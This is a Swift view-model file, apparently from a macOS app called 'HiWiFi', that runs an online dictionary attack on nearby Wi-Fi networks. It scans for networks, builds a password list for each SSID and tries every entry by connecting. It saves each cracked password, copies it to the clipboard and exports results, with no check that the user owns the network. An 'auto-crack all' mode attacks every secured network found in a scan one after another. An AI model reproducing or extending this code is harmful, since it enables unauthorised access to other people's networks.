// WiFiCrackViewModel.swift
// HiWiFi — Main ViewModel (MVVM)
// Copyright © 2026 CuoStudio. MIT License.

import SwiftUI
import AppKit

/// Central ViewModel coordinating WiFi scanning, cracking, and result management.
@MainActor
final class WiFiCrackViewModel: ObservableObject {

    // MARK: - Published State

    // Network list
    @Published var networks: [WiFiNetwork] = []
    @Published var selectedNetwork: WiFiNetwork? {
        didSet {
            speedTestResult = nil
            isTestingSpeed = false
        }
    }
    @Published var searchText = ""

    // Scanning
    @Published var isScanning = false

    // Cracking
    @Published var isCracking = false
    @Published var isPaused = false
    @Published var currentPassword = ""
    @Published var progress: Double = 0
    @Published var currentIndex = 0
    @Published var totalPasswords = 0
    @Published var speed: Double = 0
    @Published var elapsedTime: TimeInterval = 0

    // Results
    @Published var crackedResults: [CrackedResult] = []

    // Speed Test
    @Published var isTestingSpeed = false
    @Published var speedTestResult: SpeedTestResult?

    struct SpeedTestResult: Codable {
        let latencyMs: Double
        let downloadSpeedMbps: Double
    }

    // Logs
    @Published var logs: [LogEntry] = []

    // Settings
    @Published var passwordSource: PasswordGenerator.Source = .builtin
    @Published var customPasswordPath = ""
    @Published var scanTimeout: Double = 5.0
    @Published var connectTimeout: Double = 8.0
    @Published var autoCrackAll = false
    @Published var showSettings = false
    @Published var showResults = false

    // Location Permission Manager
    private let locationManager = LocationManager()

    // MARK: - Private

    private let scanner = WiFiScanner()
    private let connector = WiFiConnector()
    private var crackTask: Task<Void, Never>?
    private var timer: Timer?
    private var crackStartTime: Date?

    // MARK: - Init

    init() {
        crackedResults = CrackedResult.loadAll()
        // Prompt for Location Services permission on app startup,
        // which is required for CoreWLAN scanForNetworks to return actual results.
        locationManager.requestLocationPermission()
    }

    // MARK: - Computed

    var filteredNetworks: [WiFiNetwork] {
        guard !searchText.isEmpty else { return networks }
        return networks.filter {
            $0.ssid.localizedCaseInsensitiveContains(searchText)
        }
    }

    var canStartCrack: Bool {
        selectedNetwork != nil && !isCracking && !isScanning
    }

    // MARK: - WiFi Scanning

    func scanNetworks() {
        guard !isScanning else { return }
        isScanning = true
        log("开始扫描 WiFi 网络...", level: .info)

        Task {
            defer { isScanning = false }
            do {
                let found = try await scanner.scan()
                networks = found
                log("扫描完成，发现 \(found.count) 个网络", level: .success)

                if autoCrackAll && !found.isEmpty {
                    log("自动破解模式已开启，将依次破解所有网络", level: .info)
                    await crackAll()
                }
            } catch {
                log("扫描失败: \(error.localizedDescription)", level: .error)
            }
        }
    }

    // MARK: - Cracking

    func startCracking() {
        guard let network = selectedNetwork else {
            log("请先选择一个 WiFi 网络", level: .warning)
            return
        }
        startCracking(network: network)
    }

    func startCracking(network: WiFiNetwork) {
        stopCracking()

        crackTask = Task {
            await performCracking(network: network)
        }
    }

    private func performCracking(network: WiFiNetwork) async {
        isCracking = true
        isPaused = false
        crackStartTime = Date()
        startTimer()

        // Update network status
        updateNetworkStatus(ssid: network.ssid, status: .cracking)

        log("开始破解: \(network.ssid) [\(network.security.rawValue)]", level: .info)

        // Build password list
        let passwords = PasswordGenerator.buildPriorityList(
            for: network.ssid,
            source: passwordSource,
            customPath: customPasswordPath
        )
        totalPasswords = passwords.count
        currentIndex = 0
        progress = 0
        log("已加载 \(passwords.count) 个密码", level: .info)

        // Reset connector cache and set connection timeout
        await connector.resetConnectionState()
        await connector.setConnectTimeout(connectTimeout)

        // Try each password
        for (index, password) in passwords.enumerated() {
            // Check cancellation
            if Task.isCancelled { break }

            // Handle pause
            while isPaused {
                try? await Task.sleep(for: .milliseconds(100))
                if Task.isCancelled { break }
            }
            if Task.isCancelled { break }

            currentPassword = password
            currentIndex = index + 1
            progress = Double(currentIndex) / Double(totalPasswords)

            // Calculate speed
            if let start = crackStartTime {
                let elapsed = Date().timeIntervalSince(start)
                if elapsed >= 1.0 {
                    speed = Double(currentIndex) / elapsed
                } else {
                    speed = 0
                }
            }

            log("[\(currentIndex)/\(totalPasswords)] 尝试: \(password)", level: .info)

            // Test the password
            let success = await connector.testPassword(
                ssid: network.ssid,
                password: password,
                security: network.security
            )

            if success {
                log("✅ 破解成功! SSID: \(network.ssid), 密码: \(password)", level: .success)
                updateNetworkStatus(ssid: network.ssid, status: .success, password: password)

                // Save result
                let result = CrackedResult(
                    ssid: network.ssid,
                    password: password,
                    security: network.security.rawValue
                )
                CrackedResult.append(result)
                crackedResults = CrackedResult.loadAll()

                // Copy to clipboard
                copyToClipboard(password)
                log("密码已复制到剪贴板", level: .info)

                finishCracking()
                return
            }

            // Disconnect after failed attempt
            await connector.disconnect()
        }

        // All passwords exhausted
        if !Task.isCancelled {
            log("❌ 破解失败: 所有密码已尝试完毕", level: .error)
            updateNetworkStatus(ssid: network.ssid, status: .failed)
        }

        finishCracking()
    }

    /// Crack all scanned networks sequentially
    private func crackAll() async {
        for network in networks {
            if Task.isCancelled { break }
            if network.security == .open { continue }
            if network.status == .success { continue }

            selectedNetwork = network
            await performCracking(network: network)

            if !isCracking { break } // Stopped by user
        }
    }

    func pauseCracking() {
        isPaused = true
        log("⏸ 已暂停", level: .warning)
    }

    func resumeCracking() {
        isPaused = false
        log("▶️ 已继续", level: .info)
    }

    func stopCracking() {
        let wasCracking = isCracking
        crackTask?.cancel()
        crackTask = nil
        finishCracking()
        if wasCracking {
            log("⏹ 已停止", level: .warning)
        }
    }

    private func finishCracking() {
        isCracking = false
        isPaused = false
        timer?.invalidate()
        timer = nil
    }

    // MARK: - Timer

    private func startTimer() {
        timer?.invalidate()
        elapsedTime = 0
        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            Task { @MainActor in
                guard let self = self else { return }
                if !self.isPaused {
                    self.elapsedTime += 1
                }
            }
        }
    }

    // MARK: - Network Status

    private func updateNetworkStatus(ssid: String, status: WiFiNetwork.CrackStatus, password: String? = nil) {
        if let idx = networks.firstIndex(where: { $0.ssid == ssid }) {
            networks[idx].status = status
            if let pwd = password {
                networks[idx].crackedPassword = pwd
            }
        }
        if selectedNetwork?.ssid == ssid {
            selectedNetwork?.status = status
            if let pwd = password {
                selectedNetwork?.crackedPassword = pwd
            }
        }
    }

    // MARK: - Clipboard

    func copyToClipboard(_ text: String) {
        NSPasteboard.general.clearContents()
        NSPasteboard.general.setString(text, forType: .string)
    }

    func copyPassword(_ text: String) {
        copyToClipboard(text)
    }

    // MARK: - Logging

    struct LogEntry: Identifiable {
        let id = UUID()
        let timestamp = Date()
        let message: String
        let level: LogLevel
    }

    enum LogLevel {
        case info, success, error, warning
    }

    func log(_ message: String, level: LogLevel) {
        let entry = LogEntry(message: message, level: level)
        logs.append(entry)

        // Keep log size manageable
        if logs.count > 5000 {
            logs.removeFirst(1000)
        }
    }

    func clearLogs() {
        logs.removeAll()
    }

    // MARK: - Export

    func exportResults() {
        let panel = NSSavePanel()
        panel.allowedContentTypes = [.json, .plainText]
        panel.nameFieldStringValue = "HiWiFi_Results.json"
        panel.begin { [weak self] response in
            guard response == .OK, let url = panel.url, let self else { return }
            if let json = CrackedResult.exportAsJSON(self.crackedResults) {
                try? json.write(to: url, atomically: true, encoding: .utf8)
                self.log("结果已导出到: \(url.lastPathComponent)", level: .success)
            }
        }
    }

    // MARK: - Speed Test

    func runSpeedTest() {
        guard !isTestingSpeed else { return }
        isTestingSpeed = true
        speedTestResult = nil
        
        log("开始测试当前 WiFi 的网络性能...", level: .info)
        
        Task {
            do {
                // 1. Measure Latency (Apple Captive Portal Detection)
                let latencyStart = Date()
                let url = URL(string: "https://captive.apple.com/hotspot-detect.html")!
                var request = URLRequest(url: url)
                request.httpMethod = "HEAD"
                request.timeoutInterval = 3.0
                
                let (_, _) = try await URLSession.shared.data(for: request)
                let latency = Date().timeIntervalSince(latencyStart) * 1000.0
                
                // 2. Measure Download Speed (1MB file from Cloudflare speed test CDN)
                let downloadUrl = URL(string: "https://speed.cloudflare.com/__down?bytes=1048576")!
                let downloadStart = Date()
                let (data, _) = try await URLSession.shared.data(from: downloadUrl)
                let downloadTime = Date().timeIntervalSince(downloadStart)
                
                let bytesReceived = Double(data.count)
                let speedMbps = (bytesReceived * 8.0) / (downloadTime * 1024.0 * 1024.0)
                
                let result = SpeedTestResult(latencyMs: latency, downloadSpeedMbps: speedMbps)
                
                self.speedTestResult = result
                self.isTestingSpeed = false
                
                log(String(format: "测速完成! 延迟: %.0f ms, 下载速度: %.1f Mbps", latency, speedMbps), level: .success)
            } catch {
                self.isTestingSpeed = false
                log("测速失败: 请检查网络连接 (\(error.localizedDescription))", level: .error)
            }
        }
    }
}
